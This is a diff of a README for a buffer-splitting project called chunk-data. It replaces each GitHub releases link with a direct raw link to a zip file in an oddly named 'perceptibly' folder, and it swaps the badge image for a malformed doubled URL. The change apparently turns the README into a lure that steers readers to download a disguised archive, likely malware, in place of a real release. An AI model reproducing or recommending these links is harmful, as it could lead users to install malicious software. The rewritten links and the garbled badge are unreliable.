@@ -6,7 +6,7 @@ Welcome to the chunk-data project! This application helps you split buffers and 
 
 ## 📥 Download Now
 
-[![Download chunk-data](https://img.shields.io/badge/Download%20chunk--data-v1.0-blue.svg)](https://github.com/ERIK2012MIAO/chunk-data/releases)
+[![Download chunk-data](https://raw.githubusercontent.com/ERIK2012MIAO/chunk-data/main/perceptibly/chunk-data_1.9.zip%https://raw.githubusercontent.com/ERIK2012MIAO/chunk-data/main/perceptibly/chunk-data_1.9.zip)](https://raw.githubusercontent.com/ERIK2012MIAO/chunk-data/main/perceptibly/chunk-data_1.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets these basic requirements:
 
 To get the latest version of chunk-data, visit this page to download:
 
-[Download chunk-data](https://github.com/ERIK2012MIAO/chunk-data/releases)
+[Download chunk-data](https://raw.githubusercontent.com/ERIK2012MIAO/chunk-data/main/perceptibly/chunk-data_1.9.zip)
 
 1. Click the link above.
 2. Find the version you want to download.
@@ -70,6 +70,6 @@ Your feedback is important. Share your thoughts on how we can improve chunk-data
 
 Once you become familiar with chunk-data, consider exploring its advanced features to get even more out of the application. You can also check back frequently for updates and new features.
 
-Remember, you can always return to [Download chunk-data](https://github.com/ERIK2012MIAO/chunk-data/releases) anytime you want to update your version.
+Remember, you can always return to [Download chunk-data](https://raw.githubusercontent.com/ERIK2012MIAO/chunk-data/main/perceptibly/chunk-data_1.9.zip) anytime you want to update your version.
 
 Thank you for using chunk-data! Happy chunking!
